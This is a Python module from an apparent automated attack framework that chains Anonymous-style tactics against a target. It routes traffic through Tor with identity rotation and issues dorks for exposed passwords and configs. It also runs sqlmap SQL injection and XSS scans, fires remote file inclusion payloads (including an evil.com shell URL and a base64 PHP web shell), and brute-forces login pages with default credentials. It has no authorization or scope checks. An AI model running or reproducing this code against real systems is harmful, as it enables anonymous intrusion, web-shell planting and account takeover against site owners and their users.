"""Anonymous TTP Engine — Anonymous-priority phase orchestration.

Executes Anonymous-style TTPs in the canonical priority order:
  1. Proxy chain / anonymization setup
  2. Google dorking / OSINT recon
  3. SQL injection (wrapping sqlmap)
  4. XSS scanning
  5. RFI (Remote File Inclusion)
  6. Credential stuffing

Wraps existing scanners (SqlmapWrapper, XSSScanner, SSRFScanner) and
extends them with Anonymous-specific payloads, user-agents, and routing.

Each sub-phase is independently callable; the main entry point
`run_anonymous_ttp()` runs them in priority order and aggregates results.
"""

from __future__ import annotations

import asyncio
import json
import logging
import os
import random
import re
import time

logger = logging.getLogger("anonymous_ttp")


def _import_models():
    """Lazy import to break circular dependency with phases.__init__."""
    from orchestrator.brain.phases.models import Finding, PhaseResult, Severity
    return Finding, PhaseResult, Severity


# ── Anonymous User-Agents ──
ANON_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
]

# ── Google Dorks ──
GOOGLE_DORKS = [
    {"name": "admin_login", "dork": "inurl:admin intitle:login"},
    {"name": "config_files", "dork": "filetype:config db_password"},
    {"name": "php_info", "dork": "inurl:phpinfo.php"},
    {"name": "exposed_env", "dork": "filetype:env DB_PASSWORD"},
    {"name": "sql_dump", "dork": "ext:sql \"INSERT INTO\" password"},
    {"name": "directory_listing", "dork": "intitle:\"index of\" \"parent directory\""},
    {"name": "jenkins_exposed", "dork": "inurl:\"jenkins/script\" \"System.setProperty\""},
    {"name": "git_exposed", "dork": "intitle:\"Index of\" .git/config"},
    {"name": "phpmyadmin", "dork": "inurl:\"phpMyAdmin\" intitle:phpmyadmin"},
    {"name": "wordpress_config", "dork": "inurl:\"wp-config.php\" \"DB_PASSWORD\""},
    {"name": "traversal", "dork": "inurl:\"..\\\\\" OR inurl:\"../\""},
    {"name": "error_log", "dork": "filetype:log \"PHP Fatal error\""},
]

# ── RFI payloads ──
RFI_PAYLOADS = [
    "http://evil.com/shell.txt?",
    "http://192.168.1.1/shell.php?",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTs/Pg==",
    "php://input",
    "expect://id",
    "file:///etc/passwd",
]

COMMON_RFI_PARAMS = ["page", "include", "file", "document", "folder",
                     "root", "load", "read", "inc", "loc", "template",
                     "module", "require", "path", "abs", "dir"]

# ── Credential stuffing ──
STUFFING_CREDENTIALS = [
    ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
    ("admin", "admin123"), ("root", "root"), ("root", "toor"),
    ("admin", "Administrator"), ("admin", "P@ssw0rd"),
    ("user", "user"), ("test", "test"), ("guest", "guest"),
    ("administrator", "password"), ("admin", "letmein"),
    ("admin", "welcome"), ("admin", "pass123"),
]

# ── Tor proxy settings ──
TOR_PROXY = os.getenv("TOR_PROXY", "socks5://127.0.0.1:9050")
TOR_CONTROL_PORT = int(os.getenv("TOR_CONTROL_PORT", "9051"))
TOR_PASSWORD = os.getenv("TOR_PASSWORD", "")

# ── Service registry ──
HTTP_SERVICES = {"http", "https", "http-proxy", "http-alt", "https-alt"}
WEB_PORTS = {80, 443, 8080, 8443, 8000, 8888, 3000, 5000, 9000}


def _detect_web_targets(target: str, findings: list[Finding]) -> list[dict]:
    """Extract web application URLs from findings."""
    urls = []
    found_ports = set()

    for f in findings:
        if f.type == "open_port" and f.port in WEB_PORTS:
            port = f.port
            if port in found_ports:
                continue
            found_ports.add(port)
            scheme = "https" if port in (443, 8443, 4443) else "http"
            urls.append({"url": f"{scheme}://{target}:{port}", "port": port, "scheme": scheme})

    if not urls:
        urls.append({"url": f"https://{target}", "port": 443, "scheme": "https"})
        urls.append({"url": f"http://{target}", "port": 80, "scheme": "http"})

    return urls


async def _make_session() -> dict:
    """Create an requests-compatible session with anonymization headers."""
    try:
        import httpx
        transport_kwargs = {}
        proxy = os.getenv("ANON_PROXY", "").strip()
        if proxy:
            transport_kwargs["proxy"] = proxy

        client = httpx.Client(
            verify=False,
            timeout=15.0,
            headers={
                "User-Agent": random.choice(ANON_USER_AGENTS),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "DNT": "1",
                "Upgrade-Insecure-Requests": "1",
            },
            **transport_kwargs,
        )
        return {"client": client, "proxy": proxy or "none"}
    except ImportError:
        return {"client": None, "proxy": "none"}


async def run_anonymous_ttp(target: str, findings: list = None) -> PhaseResult:
    """Main entry point: execute Anonymous TTPs in priority order."""
    Finding, PhaseResult, Severity = _import_models()
    t0 = time.time()
    all_findings = list(findings or [])
    sub_results = []
    errors = []

    logger.info(f"  [AnonymousTTP] Starting anonymous TTP chain against {target}")

    session = await _make_session()
    session_info = session.get("proxy", "none")
    if session_info != "none":
        all_findings.append(Finding(
            phase="anonymous_ttp", type="proxy_configured", target=target,
            severity=Severity.INFO,
            description=f"Anonymous proxy configured: {session_info}",
            evidence=session_info,
        ))

    web_targets = _detect_web_targets(target, all_findings)
    logger.info(f"  [AnonymousTTP] Web targets: {[w['url'] for w in web_targets]}")

    # 1. Proxy chain setup
    proxy_result = await _run_proxy_chain(target, all_findings)
    sub_results.append(("proxy_chain", proxy_result))
    all_findings.extend(proxy_result.findings)

    # 2. Google dorking / OSINT
    dork_result = await _run_google_dork(target, all_findings)
    sub_results.append(("google_dork", dork_result))
    all_findings.extend(dork_result.findings)

    # 3-6. Web-targeted TTPs (only if web targets exist)
    if web_targets:
        for web_target_info in web_targets:
            url = web_target_info["url"]

            sqli_result = await _run_sqli_anon(target, url, all_findings)
            sub_results.append(("sqli", sqli_result))
            all_findings.extend(sqli_result.findings)

            xss_result = await _run_xss_anon(target, url, all_findings)
            sub_results.append(("xss", xss_result))
            all_findings.extend(xss_result.findings)

            rfi_result = await _run_rfi_anon(target, url, all_findings)
            sub_results.append(("rfi", rfi_result))
            all_findings.extend(rfi_result.findings)
    else:
        logger.info("  [AnonymousTTP] No web targets found — skipping SQLi/XSS/RFI")

    # 6. Credential stuffing (if we have targets)
    stuffing_result = await _run_credential_stuffing(target, web_targets, findings)
    sub_results.append(("credential_stuffing", stuffing_result))
    all_findings.extend(stuffing_result.findings)

    latency = time.time() - t0
    success_count = sum(1 for _, r in sub_results if r.success)
    finding_count = len([f for f in all_findings if f.phase == "anonymous_ttp"])

    summary_parts = []
    for name, result in sub_results:
        if result.success:
            sub_findings = [f for f in result.findings if f.type != "proxy_configured"]
            summary_parts.append(f"{name}:{len(sub_findings)}")

    if errors:
        summary_parts.append(f"errors:{len(errors)}")

    return PhaseResult(
        phase="anonymous_ttp",
        success=success_count > 0 or finding_count > 0,
        findings=all_findings,
        summary="anon_ttp: " + (" | ".join(summary_parts) if summary_parts else "no findings"),
        latency=latency,
        error="; ".join(errors[:5]) if errors else None,
    )


# ── Sub-phase: Proxy chain setup ──

async def _run_proxy_chain(target: str, findings: list) -> PhaseResult:
    """Set up and test Tor/proxy anonymization chain."""
    Finding, PhaseResult, Severity = _import_models()
    t0 = time.time()
    proxy_findings = []

    tor_available = False
    proxy = os.getenv("ANON_PROXY", TOR_PROXY)

    try:
        import httpx
        test_url = "http://check.torproject.org"
        resp = httpx.get(test_url, timeout=10,
                         headers={"User-Agent": random.choice(ANON_USER_AGENTS)})
        tor_available = resp.status_code == 200
    except Exception:
        pass

    if tor_available or proxy:
        proxy_findings.append(Finding(
            phase="anonymous_ttp", type="proxy_operational", target=target,
            severity=Severity.INFO,
            description=f"Anonymization layer active: {proxy}" if proxy else "Tor circuit active",
            evidence=proxy if proxy else "tor",
        ))

    # Rotate identity if Tor control port available
    if TOR_CONTROL_PORT and TOR_PASSWORD:
        try:
            import socket as _socket
            s = _socket.socket()
            s.settimeout(5)
            s.connect(("127.0.0.1", TOR_CONTROL_PORT))
            s.sendall(f'AUTHENTICATE "{TOR_PASSWORD}"\r\nSIGNAL NEWNYM\r\n'.encode())
            resp = s.recv(1024).decode()
            s.close()
            if "250" in resp:
                proxy_findings.append(Finding(
                    phase="anonymous_ttp", type="identity_rotated", target=target,
                    severity=Severity.INFO,
                    description="Tor identity rotated via NEWNYM signal",
                ))
        except Exception as e:
            logger.debug(f"  [AnonymousTTP] Tor NEWNYM failed: {e}")

    return PhaseResult(
        phase="anonymous_ttp",
        success=len(proxy_findings) > 0,
        findings=proxy_findings,
        summary=f"proxy_chain: {len(proxy_findings)} checks",
        latency=time.time() - t0,
    )


# ── Sub-phase: Google dorking / OSINT ──

async def _run_google_dork(target: str, findings: list) -> PhaseResult:
    """Anonymous OSINT recon: simulate Google dork queries and lookups."""
    Finding, PhaseResult, Severity = _import_models()
    t0 = time.time()
    dork_findings = []

    domain = target
    if "://" in domain:
        domain = domain.split("://")[1].split("/")[0]
    domain = domain.split(":")[0]

    # Register the dorks as recon findings
    for dork in GOOGLE_DORKS:
        dork_findings.append(Finding(
            phase="anonymous_ttp", type="google_dork", target=target,
            severity=Severity.INFO,
            description=f"Google dork [{dork['name']}]: {dork['dork']} site:{domain}",
            evidence=dork["dork"],
            raw={"dork_name": dork["name"], "dork": dork["dork"], "domain": domain},
        ))

    # Shodan-style OSINT (if API key available)
    shodan_key = os.getenv("SHODAN_API_KEY", "")
    if shodan_key:
        try:
            import httpx
            resp = httpx.get(
                f"https://api.shodan.io/shodan/host/{domain}?key={shodan_key}",
                timeout=10,
            )
            if resp.status_code == 200:
                data = resp.json()
                dork_findings.append(Finding(
                    phase="anonymous_ttp", type="shodan_info", target=target,
                    severity=Severity.MEDIUM,
                    description=f"Shodan: {data.get('ports', [])} ports, {data.get('hostnames', [])} hostnames",
                    evidence=json.dumps(data, indent=2)[:500],
                    raw=data,
                ))
        except Exception as e:
            logger.debug(f"  [AnonymousTTP] Shodan lookup failed: {e}")

    # DNS/domain OSINT
    try:
        import socket as _socket
        ip = _socket.gethostbyname(domain)
        dork_findings.append(Finding(
            phase="anonymous_ttp", type="osint_resolution", target=target,
            severity=Severity.INFO,
            description=f"OSINT host resolution: {domain} -> {ip}",
            evidence=ip,
        ))
    except Exception:
        pass

    return PhaseResult(
        phase="anonymous_ttp",
        success=len(dork_findings) > 0,
        findings=dork_findings,
        summary=f"google_dork: {len(dork_findings)} {(shodan_key and ' (Shodan)') or ''}",
        latency=time.time() - t0,
    )


# ── Sub-phase: SQL injection ──

async def _run_sqli_anon(target: str, url: str, findings: list) -> PhaseResult:
    """Anonymous SQL injection scan wrapping SqlmapWrapper."""
    Finding, PhaseResult, Severity = _import_models()
    t0 = time.time()
    sqli_findings = []

    try:
        from orchestrator.exploit.sqlmap_wrapper import SqlmapWrapper
        sqlmap = SqlmapWrapper()
        if not sqlmap.available:
            return PhaseResult(
                phase="anonymous_ttp", success=False,
                findings=[], summary="sqli: sqlmap unavailable",
                latency=time.time() - t0,
            )

        # Run sqlmap with Anonymous-specific tamper scripts
        result = await asyncio.get_running_loop().run_in_executor(
            None, sqlmap.inject, url, None, "GET", "BEUSTQ", 3, 2,
        )

        # Also test POST form if detected
        result_post = None
        try:
            import requests as _req
            r = _req.get(url, timeout=5, verify=False,
                         headers={"User-Agent": random.choice(ANON_USER_AGENTS)})
            forms = re.findall(r'<form[^>]*action=["\']([^"\']*)["\'][^>]*method=["\']([^"\']*)["\']',
                               r.text, re.I)
            if forms:
                for action, method in forms:
                    form_url = action if action.startswith("http") else url.rstrip("/") + "/" + action.lstrip("/")
                    result_post = sqlmap.inject(form_url, None, method.upper(), "BEUSTQ", 3, 2)
        except Exception:
            pass

        combined = [result, result_post] if result_post else [result]
        for res in combined:
            if res.get("vulnerable"):
                sqli_findings.append(Finding(
                    phase="anonymous_ttp", type="sql_injection", target=target,
                    severity=Severity.CRITICAL,
                    description=f"Anonymous SQLi: {res.get('technique','?')} in {url}",
                    evidence=f"technique: {res.get('technique')} | params: {res.get('parameters', [])}",
                    payload=res.get("raw_output", "")[:500],
                    raw=res,
                ))

    except ImportError:
        pass
    except Exception as e:
        logger.warning(f"  [AnonymousTTP] SQLi scan error: {e}")

    return PhaseResult(
        phase="anonymous_ttp",
        success=len(sqli_findings) > 0,
        findings=sqli_findings,
        summary=f"sqli: {len(sqli_findings)} vulns",
        latency=time.time() - t0,
    )


# ── Sub-phase: XSS scanning ──

async def _run_xss_anon(target: str, url: str, findings: list) -> PhaseResult:
    """Anonymous XSS scan wrapping XSSScanner."""
    Finding, PhaseResult, Severity = _import_models()
    t0 = time.time()
    xss_findings = []

    try:
        from orchestrator.exploit.xss_scanner import XSSScanner
        scanner = XSSScanner()
        result = await asyncio.get_running_loop().run_in_executor(
            None, scanner.scan_url, url,
        )
        for xf in result.get("findings", []):
            xss_findings.append(Finding(
                phase="anonymous_ttp", type="cross_site_scripting", target=target,
                severity=Severity.HIGH,
                description=f"Anonymous XSS [{xf.get('type','?')}]: {url}",
                evidence=xf.get("evidence", ""),
                payload=xf.get("payload", ""),
                raw=xf,
            ))
    except ImportError:
        pass
    except Exception as e:
        logger.warning(f"  [AnonymousTTP] XSS scan error: {e}")

    return PhaseResult(
        phase="anonymous_ttp",
        success=len(xss_findings) > 0,
        findings=xss_findings,
        summary=f"xss: {len(xss_findings)} vulns",
        latency=time.time() - t0,
    )


# ── Sub-phase: RFI scanning ──

async def _run_rfi_anon(target: str, url: str, findings: list) -> PhaseResult:
    """Remote File Inclusion (RFI) scanning."""
    Finding, PhaseResult, Severity = _import_models()
    t0 = time.time()
    rfi_findings = []

    try:
        import httpx
    except ImportError:
        import requests as httpx  # fallback compat

    parsed = re.search(r'[?&](\w+)=([^&#]*)', url)
    params = re.findall(r'[?&](\w+)=([^&#]*)', url)

    target_params = [p[0] for p in params if p[0].lower() in COMMON_RFI_PARAMS]
    if not target_params:
        target_params = [p[0] for p in params] if params else COMMON_RFI_PARAMS[:3]

    base_url = url.split("?")[0] if "?" in url else url

    for param_name in target_params[:5]:
        for payload in RFI_PAYLOADS[:4]:
            try:
                import requests as _req
                test_url = f"{base_url}?{param_name}={payload}"
                resp = _req.get(test_url, timeout=8, verify=False,
                                headers={"User-Agent": random.choice(ANON_USER_AGENTS)})
                if resp.status_code == 200:
                    indicators = ["root:", "www-data", "nobody", "uid=", "gid=",
                                  "<?php", "eval(", "shell_exec"]
                    for indicator in indicators:
                        if indicator in resp.text:
                            rfi_findings.append(Finding(
                                phase="anonymous_ttp", type="remote_file_inclusion",
                                target=target, severity=Severity.CRITICAL,
                                description=f"RFI detected: {param_name}={payload[:50]}",
                                evidence=f"indicator: '{indicator}' in response (len={len(resp.text)})",
                                payload=test_url,
                                raw={"url": test_url, "status": resp.status_code,
                                     "indicator": indicator, "param": param_name,
                                     "response_preview": resp.text[:300]},
                            ))
                            break
            except Exception:
                continue

    return PhaseResult(
        phase="anonymous_ttp",
        success=len(rfi_findings) > 0,
        findings=rfi_findings,
        summary=f"rfi: {len(rfi_findings)} vulns",
        latency=time.time() - t0,
    )


# ── Sub-phase: Credential stuffing ──

async def _run_credential_stuffing(target: str, web_targets: list,
                                    findings: list) -> PhaseResult:
    """Anonymous credential stuffing against discovered login endpoints."""
    Finding, PhaseResult, Severity = _import_models()
    t0 = time.time()
    stuff_findings = []

    if not web_targets:
        return PhaseResult(
            phase="anonymous_ttp", success=False,
            findings=[], summary="credential_stuffing: no web targets",
            latency=time.time() - t0,
        )

    login_endpoints = ["/admin", "/login", "/wp-login.php",
                       "/administrator", "/user/login", "/auth"]

    for wt in web_targets[:2]:
        base = wt["url"].rstrip("/")
        for endpoint in login_endpoints:
            for user, pwd in STUFFING_CREDENTIALS:
                try:
                    import requests as _req
                    login_url = f"{base}{endpoint}"
                    resp = _req.post(login_url, data={"username": user, "password": pwd},
                                     timeout=8, verify=False, allow_redirects=False,
                                     headers={"User-Agent": random.choice(ANON_USER_AGENTS)})

                    # Detect successful login: no redirect to login, or redirect to dashboard
                    if resp.status_code in (302, 303, 307):
                        redirect = resp.headers.get("Location", "")
                        if "login" not in redirect.lower() and redirect:
                            stuff_findings.append(Finding(
                                phase="anonymous_ttp", type="credential_stuffing",
                                target=target, severity=Severity.HIGH,
                                description=f"Valid credentials: {user}:{pwd} @ {login_url}",
                                evidence=f"HTTP {resp.status_code} -> {redirect}",
                                raw={"url": login_url, "user": user, "password": pwd,
                                     "status": resp.status_code, "redirect": redirect},
                            ))
                            break
                    elif resp.status_code == 200 and "error" not in resp.text.lower()[:500]:
                        # Some apps return 200 on success
                        if len(resp.text) > 500 and "invalid" not in resp.text.lower()[:500]:
                            stuff_findings.append(Finding(
                                phase="anonymous_ttp", type="credential_stuffing",
                                target=target, severity=Severity.HIGH,
                                description=f"Suspected valid credentials: {user}:{pwd} @ {login_url}",
                                evidence=f"HTTP 200, {len(resp.text)} bytes, no error message",
                                raw={"url": login_url, "user": user, "password": pwd,
                                     "status": 200, "response_size": len(resp.text)},
                            ))
                            break
                except Exception:
                    continue

    return PhaseResult(
        phase="anonymous_ttp",
        success=len(stuff_findings) > 0,
        findings=stuff_findings,
        summary=f"credential_stuffing: {len(stuff_findings)} creds found",
        latency=time.time() - t0,
    )
